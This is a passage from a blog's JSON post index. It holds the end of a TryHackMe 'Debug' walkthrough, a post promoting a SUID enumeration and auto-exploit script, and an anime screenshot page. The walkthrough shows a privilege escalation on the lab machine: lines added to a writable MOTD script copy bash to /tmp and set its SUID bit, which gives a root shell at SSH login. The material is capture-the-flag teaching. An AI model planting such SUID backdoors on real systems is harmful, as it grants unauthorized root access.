21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  james@osboxes:~$ cat .bash_history ls clear exit ls clear exit ls clear exit ls cd /home/james/ ls cat Note-To-James.txt ls cd /etc/update-motd.d/ ls ls -la ls clear ls clear ls clera ls clear ls clear ls -la cd / ls cd /root/ ls exit ls clear exit nano id_rsa chmod 600 id_rsa ssh -i id_rsa root@10.250.0.12 exit   \u0026ndash;\nWe\u0026rsquo;ve a note file in the local directory:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  james@osboxes:~$ cat Note-To-James.txt Dear James, As you may already know, we are soon planning to submit this machine to THM\u0026#39;s CyberSecurity Platform! Crazy... Isn\u0026#39;t it? But there\u0026#39;s still one thing I\u0026#39;d like you to do, before the submission. Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D I gave you access to modify all these files :) Oh and one last thing... You gotta hurry up! We don\u0026#39;t have much time left until the submission! Best Regards, root   \u0026ndash;\nWe\u0026rsquo;ve seen .bash_history containing a directory /etc/update-motd.d/, let\u0026rsquo;s check it out!\n1 2 3 4 5 6 7 8 9 10 11 12  james@osboxes:~$ ls -la /etc/update-motd.d/ total 44 drwxr-xr-x 2 root root 4096 Mar 10 18:38 . drwxr-xr-x 134 root root 12288 Mar 10 20:08 .. -rwxrwxr-x 1 root james 1220 Mar 10 18:32 00-header -rwxrwxr-x 1 root james 0 Mar 10 18:38 00-header.save -rwxrwxr-x 1 root james 1157 Jun 14 2016 10-help-text -rwxrwxr-x 1 root james 97 Dec 7 2018 90-updates-available -rwxrwxr-x 1 root james 299 Jul 22 2016 91-release-upgrade -rwxrwxr-x 1 root james 142 Dec 7 2018 98-fsck-at-reboot -rwxrwxr-x 1 root james 144 Dec 7 2018 98-reboot-required -rwxrwxr-x 1 root james 604 Nov 5 2017 99-esm   We can see that we\u0026rsquo;ve read/write/execute permissions on the files. But what can we do with these?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  james@osboxes:/etc/update-motd.d$ cat 00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland \u0026lt;kirkland@canonical.com\u0026gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] \u0026amp;\u0026amp; . /etc/lsb-release if [ -z \u0026#34;$DISTRIB_DESCRIPTION\u0026#34; ] \u0026amp;\u0026amp; [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf \u0026#34;Welcome to %s (%s %s %s)\\n\u0026#34; \u0026#34;$DISTRIB_DESCRIPTION\u0026#34; \u0026#34;$(uname -o)\u0026#34; \u0026#34;$(uname -r)\u0026#34; \u0026#34;$(uname -m)\u0026#34;   Alright, seems like simple bash commands, let\u0026rsquo;s just copy bash to tmp and set root\u0026rsquo;s SUID bit on it and see if that works.\nAdded the instructions in 3-4 lines.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  james@osboxes:/etc/update-motd.d$ cat 00-header #!/bin/sh cp /bin/bash /tmp/ chmod u+s /tmp/bash # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland \u0026lt;kirkland@canonical.com\u0026gt; # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] \u0026amp;\u0026amp; . /etc/lsb-release if [ -z \u0026#34;$DISTRIB_DESCRIPTION\u0026#34; ] \u0026amp;\u0026amp; [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf \u0026#34;Welcome to %s (%s %s %s)\\n\u0026#34; \u0026#34;$DISTRIB_DESCRIPTION\u0026#34; \u0026#34;$(uname -o)\u0026#34; \u0026#34;$(uname -r)\u0026#34; \u0026#34;$(uname -m)\u0026#34;   But how does this execute? Is there a cron? don\u0026rsquo;t think so.\nSince, the .bash_history shows we need to ssh for the instructions to execute, let\u0026rsquo;s try and SSH as james.\nRoot! Cool, we\u0026rsquo;ve got SUID bit of root user on the bash file, let\u0026rsquo;s get root! :)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  james@osboxes:~$ /tmp/bash -p bash-4.3# id uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james) bash-4.3# cd /root bash-4.3# ls -al total 48 drwx------ 7 root root 4096 Mar 10 18:36 . drwxr-xr-x 24 root root 4096 Feb 28 2019 .. -rw------- 1 root root 1257 Mar 10 18:38 .bash_history -rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc drwxr-xr-x 3 root root 4096 Mar 9 20:01 .bundle drwx------ 2 root root 4096 Mar 10 18:36 .cache drwxr-xr-x 3 root root 4096 Mar 9 20:00 .gem drwxr-xr-x 2 root root 4096 Mar 10 18:35 .nano -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 33 Mar 9 20:56 root.txt drwx------ 2 root root 4096 Mar 9 20:55 .ssh -rw-r--r-- 1 root root 211 Mar 9 19:59 .wget-hsts bash-4.3# bash-4.3#   The flag is of the characters what we need!\n1 2 3 4 5 6  bash-4.3# wc -c root.txt 33 root.txt bash-4.3# id uid=1001(james) gid=1001(james) euid=0(root) groups=1001(james) bash-4.3# uname -a Linux osboxes 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux   Thanks for reading the walkthrough, hopefully you enjoyed it. I think maybe I was too verbose while writing it :P\n","description":"Walkthrough of the machine Debug on TryHackMe - https://tryhackme.com/room/debug","id":3,"section":"posts","tags":["tryhackme","ssh","http","metasploit","rustscan","php","deserialization","rce","privesc","cracking"],"title":"TryHackMe - Debug","uri":"https://umar0x01.sh/posts/debug-thm/"},{"content":"What the heck is SUID ENUM!? Are you also tired of finding \u0026amp;\u0026amp; enumerating possibly exploitable SUID binaries like me!? Only to miss the ones you were going to escalate your priviliges with?\nWelp, I just happened to develop a solution: SUID 3NUM.\n (Self promote, I will! - Yoda)\n A (not-so-cool-as-it-seems-like) standalone script supporting both python2 \u0026amp; python3 to find out all SUID binaries in a linux box and do the following:\n List all Default SUID Binaries (which ship with linux/aren\u0026rsquo;t exploitable) List all Custom Binaries (which don\u0026rsquo;t ship with packages/vanilla installation) List all Custom binaries found in GTFO Bin\u0026rsquo;s list (This is where things get interesting) Try and auto-exploit found custom SUID binaries which won\u0026rsquo;t impact any of the machine\u0026rsquo;s binaries  \u0026lt;!\u0026ndash; Description goes here \u0026ndash;\u0026gt; Many of the times while doing Vulnhub, HTB \u0026amp;\u0026amp; other vulnerable machines, I stumbled upon SUID binaries in the box, I didn\u0026rsquo;t have any method to seperate exploitable SUID binaries from those default SUID binaries of the system.\nFortunately, LinEnum seperated vulnerable binaries which were present in list of GTFO Bins and presented it nicely in a new section named Interesting SUID Bins.\nAwesome, isn\u0026rsquo;t it? By this time, you\u0026rsquo;ll be asking yourself, then why da heck I made this blog post and that script, If LinEum is so cool!?\n\u0026ndash;\nLets get on that now: Now,\n What if a binary isn\u0026rsquo;t in GTFO\u0026rsquo;s bins list and is still exploitable? What If the sysadmin renamed the exploitable binary (like cp, find, cat, vim, iftop etc.) to something else? What if there\u0026rsquo;s a custom C/C++ compiled binary having SUID bit set on it?  You\u0026rsquo;ll definitely miss that one binary through which you were going to escalate yourself to the next level. We all know, when LinEnum shows interesting SUID bins list, nobody ever looks at the whole list of the SUID binaries!\nAlso, LinEnum and other enumeration scripts only print SUID binaries \u0026amp; GTFO Binaries, they don\u0026rsquo;t seperate default binaries from custom binaries, which lead to severe head banging in walls for 3-4 hours when you can\u0026rsquo;t escalate priviliges :)\nSolution: The above issues struck me to create a script which seperates both custom SUID bit-set binaries and default binaries, cross-match custom binaries with GTFO Bin\u0026rsquo;s binaries list. Further, go-ahead, try and auto-exploit them (only in case, they aren\u0026rsquo;t going to alter any files on the system!)\nUsage Initializing Script\npython suid3num.py  Doing Auto Exploitation of Exploitable SUID binaries\npython suid3num.py -e  Screenshots/Working Here are some screenshots describing output of the script:\n SUID Enumeration (without -e)  Auto-Exploitation of SUID Binaries (with -e)  Updated asciicast  FAQ  Can I run it on OSCP labs/exam machines?  According to some folks, as long as you aren\u0026rsquo;t using -e flag, its completely fine! Also, I myself used it in mine, so no probs!\nYou like it now, don\u0026rsquo;t you? ( ͡° ͜ʖ ͡°) Future ToDo(s):  Get a Life ¯\\(ツ)/¯ Make improvements in default SUID binaries list Create scripts for linux capabilities and for binaries one can run with sudo  ./aightImmaHeadOut Hope, you like the script, you can find me @syed__umar on twitter!\nSee ya, later!\n","description":"A standalone python script which utilizes python's built-in modules to find SUID bins, separate default bins from custom bins, cross-match those with bins in GTFO Bin's repository \u0026 auto-exploit those, all with colors! ( ͡ʘ ͜ʖ ͡ʘ)","id":4,"section":"posts","tags":["python","automation","suid","privesc"],"title":"SUID Enumeration \u0026 Exploitation - The Automated Way!","uri":"https://umar0x01.sh/posts/suid-enumeration/"},{"content":"Welp, in my free time, I like to watch anime and take random screenshots of moments I think are great or of images I later want to convert to my profile pictures, etc.\nEnjoy the view! :D\nFog Hill of the Five Elements - 雾山五行   God of High School - Gat Obeu Hai Seukul   Grandmaster of Demonic Cultivation - Mo Dao Zu Shi   Demon Slayer - Kimetsu No Yaiba   Violet Evergarden - ヴァイオレット・エヴァーガーデン   One Piece   ","description":"Welp, in my free time, I like to watch anime and take random screenshots of moments I think are great or of images I later want to convert to my profile pictures, etc.","id":6,"section":"","tags":null,"title":"Anime (frames/screenshots)","uri":"https://umar0x01.sh/anime/"}]